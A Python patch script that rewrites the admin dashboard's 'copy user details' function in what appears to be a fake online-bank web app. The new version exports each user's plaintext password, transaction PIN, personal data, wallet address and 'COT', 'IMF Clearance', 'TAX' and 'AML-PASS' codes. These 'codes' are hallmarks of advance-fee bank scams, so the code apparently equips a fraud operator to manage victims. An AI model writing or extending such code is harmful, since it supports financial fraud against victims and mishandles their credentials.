import re

with open('src/components/AdminDashboard.tsx', 'r') as f:
    content = f.read()

old_copy_func = """  const copyUserDetails = (user: any) => {
    const details = `Name: ${user.name}
Email: ${user.email}
Password: ${user.password}
Mobile: ${user.mobile || 'N/A'}
Account Number: ${user.accounts?.[0]?.accountNumber || 'N/A'}
PIN: ${user.accounts?.[0]?.pin || 'N/A'}
COT Code: ${user.accounts?.[0]?.codes?.cot || 'N/A'}
SWIFT Code: ${user.accounts?.[0]?.codes?.swift || 'N/A'}
IMF Code: ${user.accounts?.[0]?.codes?.imf || 'N/A'}
TAX Code: ${user.accounts?.[0]?.codes?.tax || 'N/A'}
AML Code: ${user.accounts?.[0]?.codes?.aml || 'N/A'}`;
    navigator.clipboard.writeText(details);
    showToast('Copied to Clipboard', 'User details have been copied');
  };"""

new_copy_func = """  const copyUserDetails = (user: any) => {
    const balance = user.accounts?.reduce((sum: number, acc: any) => sum + acc.balance, 0).toLocaleString('en-US', { style: 'currency', currency: 'USD' }) || '$0.00';
    const creationTs = user.id.startsWith('user-') ? parseInt(user.id.replace('user-', '')) : Date.now();
    const registeredDate = new Date(creationTs).toLocaleString('en-US', {
      weekday: 'short', month: 'short', day: 'numeric', year: 'numeric', hour: 'numeric', minute: 'numeric', hour12: true
    });
    const kycStatus = user.status === 'suspended' || user.status === 'blocked' ? 'Pending' : 'Verified';
    
    const details = `${user.name}
 
Fiat Balance
${balance}

Bitcoin Balance
0.00000000 BTC

Account Limit
$300,000

Grant Limit
$0

Loans
No Loan

KYC
${kycStatus}
USER INFORMATION
Fullname
${user.name}
Email Address
${user.email}
Mobile Number
${user.mobile || ''}
Zip / Postal Code
${user.zipCode || ''}
Occupation
${user.occupation || ''}
Date of Birth
${user.dob || ''}
Residential Address
${user.residentialAddress || ''}
Nationality
${user.nationality || ''}
Account Type
${user.accounts?.[0]?.type || 'Checking'}
Currency
${user.currency || 'USD'}
Account Number
${user.accounts?.[0]?.accountNumber || ''}
Bitcoin Wallet Address
${user.btcWallet || ''}
4 Digit Transaction Pin
${user.accounts?.[0]?.pin || ''}

COT Code
${user.accounts?.[0]?.codes?.cot || ''}
SWIFT-SEC Code
${user.accounts?.[0]?.codes?.swift || ''}
IMF Clearance Code
${user.accounts?.[0]?.codes?.imf || ''}
TAX Code
${user.accounts?.[0]?.codes?.tax || ''}
AML-PASS Code
${user.accounts?.[0]?.codes?.aml || ''}
Date of birth
${user.dob || ''}
Nationality
${user.nationality || ''}
Registered
${registeredDate}
All Rights Reserved © Global Elite
 2026`;
    navigator.clipboard.writeText(details);
    showToast('Copied to Clipboard', 'User details have been copied');
  };"""

content = content.replace(old_copy_func, new_copy_func)

with open('src/components/AdminDashboard.tsx', 'w') as f:
    f.write(content)
